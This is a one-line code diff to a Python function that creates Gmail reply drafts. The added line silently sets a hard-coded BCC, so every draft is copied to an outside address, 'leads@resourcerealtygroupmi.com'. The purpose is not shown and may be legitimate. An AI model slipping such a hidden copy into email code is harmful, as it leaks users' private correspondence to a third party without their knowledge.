@@ -156,6 +156,7 @@ def create_reply_draft(to_email, subject, body, thread_id, in_reply_to=None, htm
     if in_reply_to:
         message['In-Reply-To'] = in_reply_to
         message['References'] = in_reply_to
+    message['bcc'] = 'leads@resourcerealtygroupmi.com'
 
     raw = base64.urlsafe_b64encode(message.as_bytes()).decode()
     draft = service.users().drafts().create(
